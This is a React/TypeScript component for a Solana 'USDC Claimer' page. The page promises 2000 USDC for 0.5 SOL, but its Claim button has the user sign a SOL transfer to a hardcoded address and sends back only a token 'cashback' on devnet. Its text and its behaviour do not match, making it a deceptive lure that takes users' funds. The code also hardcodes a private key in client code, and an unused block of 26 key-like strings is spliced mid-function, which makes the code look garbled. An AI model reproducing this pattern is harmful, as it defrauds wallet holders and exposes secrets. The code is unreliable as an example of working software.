/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3caNKodpi4rjKQmRbqtqzVFXeZ3B5JwRfSY38btmiPAAKaFsKHEJKBSaVzQGXQfzXz1fLe6KpxzR6N2uJ9QaM7eX"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2ymh3fzA57mKffxu1SqBXgXcC76u5iofRM9ScM9joFhGAM3DB1sDwWHVr6wtWgEf9gYJC7kKaXmffhrouFf2pF6M",
  "key1": "2pjkcaVCaMk4s7trVFmzTLRgkXZ5hJrtirXuo8XCsaStZY169cHLSR3tyUQwRi9tExE9C5qbs3YYYq6j1svdFohF",
  "key2": "WcW9mFi2V3633maQzmY3MJLahnM9akc9Ve14BqppgazKCzmscn682pzF35Ufoxf1Em3ThMFVczNhaeBWdeCsvcQ",
  "key3": "gBgSFYALy7sTfss35VSsr2GKfhBypk8LZ6d96FRAcUr8p5KiU9suY9yHi7RUt9jwLDXxv1Wt1bS7CXuEv1xRNk1",
  "key4": "24zkg7TZJGdk5rZSA5aLvkdJWbgNun1b2hy5dDBdeRVubh1FuAcyhD1HFHGQFBoVd8574KFNMpxzMDGVASSifrkX",
  "key5": "62jMs4jTZYKHJzkEyYwg21Xvwkm4RdtnFmaB5R3HmH6rh1fFSkU1ktq6Q7yNN5BFCrca8g2qwdt3WDLBD38nRDS",
  "key6": "5Wom3TMDKmBJ6ujiV2ggDM9nSHA9BczNVr9mzvAS6B4J8Tc4vdGT1oFFqNuBFS4r8pHnYXKHTdA1djpMcg6rYus",
  "key7": "hWc5FwqY53keWjE1deMzZF3puB3oWXuWN1ocdgUgTSyeMsGRKW8FHYe1x99NvchQkGmwJx77VUW4x2eniHcotCw",
  "key8": "21CAEK68UWeYvFa3FqAk8n7j9NLoTfCkt2pYUtXhb8kjXhAkQSv1dB4TB1yTBuBMX1tW4sHw1uvMzeBHbLPxGu3K",
  "key9": "2fUAkBGFHW6VSpCsH81wkvMjte6Lc8zCbenzzeCVB81mMx2qnxuaCeggRxxqWoL2CK9cmiD6wtWntE9uBE3nw24e",
  "key10": "4zrqYbSKNMpjswP9okqZ9EUwfDcGMjNwhYwDTvCd4uuAd6GJaTVuhm4MVkE4ENTVxCkAYPyK8PSqaHWMEDWQiDQD",
  "key11": "39M7vcHsZY8wnmWqLtwYDQyiQfkHv8ogNxjgDo2Nrr7wP9J9Hyjcc4NGiKj5RXFCt4yZR4d5hvbnUeWoSY2d9g75",
  "key12": "5E6kbAj9oX7faVHdJYQsbiRgzWBTDjFLtQqmQJdfmM3WVw8zN9zvw3aufDo9Xx2c4eHeQQNfcMMLmxtwGETuDtjt",
  "key13": "5WptGLEjug44z2Mu4MY2KysJ6st5RESot5jARcriwHYzGY14x8gwkgt9LxqBKpMGjgo6QYSfoDSoRg44H5Yiqmpk",
  "key14": "3dgCLjE9MprX6jGZjTWh93tkdGCzP1U3h3mn8nHB7bsRz2iYvCoDFaNfFMeFbstDnjyembFc7Kot1VcsZnL44yBR",
  "key15": "5e688b9B2QJZriWrVmJC8deYGpASWT3kTXWmi6K6nDWhpuvZ7geiJvH163qyT96N2o2PpJ5jKc5kSM1d6FSP5jFR",
  "key16": "9VTYTY8meXvcEht7ZGz1ooHjstEszYy29MP9TqEEPTumjPSpfBseMRxMmJcM4b4szPLq2us9HfQH3bGKoQMDzRF",
  "key17": "2voidZ5Si4qhED8dSoiJD4Gr89RuvqHs1ER5UCzmyFGBweUv7GTuAGEB3C7MWKeic3yguoWN84T6d4tbcMJQGJ7z",
  "key18": "2bnsU8ruS96haXBBb53VahCTdaS7WXMpMta2VQoen7MbP24xTVomCsspxsWeBuXvE88dtdoN4PsdqACzk5M4UoTj",
  "key19": "4zrFGRqUyUktSRcL64xTiqBsT9NdYfQeQdUchS8EUADPcQK1FHyWdqNpALREXDizoaBUoUaQLxUzX5QxH9ux6Mk5",
  "key20": "ueY8bJhjL8CuZrBWfsNZzNKsLtn83m67haY2sM1y45yvp461wT1GQQiT2XiLR4gjPSrSF9Lw3jtMorfjXEyiwdj",
  "key21": "4XxZrKsKBuD48zgg26rYwk2ErxufjhczgWnPqMH4Y8iYvePBajJ7aGfZ7nrW8aRjWaNWFsvbLAFXy7dh5JKWDteq",
  "key22": "49AgfUdifgqn9cCtakyQusGZ2rCQrDcnZi3ejw6Zgfi9JHLkaQoqMXBshkCnm1K7XdPX9Vv1TiaxCdjNo3CAb2b4",
  "key23": "1283VyoEVmvkyLXTthxsdx1VzMcvsnrzQHj4GamDDeXEnGrJ7Dgwhjht9VZmvVMeqHxcJWpXzM8ohEPkYEAVrg7S",
  "key24": "LbPpoLSKyDP2tSieGqRCXj9QeDhL5xFEWpmCPgLvb7YZJ1X9StW6Eeez8HacYaLTxiK1inQVQXAgV2WQ81nnsrX",
  "key25": "Bot1wpDDXKXZgKsoKVPEXRzsrBjq8ediATkDoEdZt2YL9Mr78Zoh3CzJGjg5LBdaCxYG7DNJxvdyuB4bzBK4YYZ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
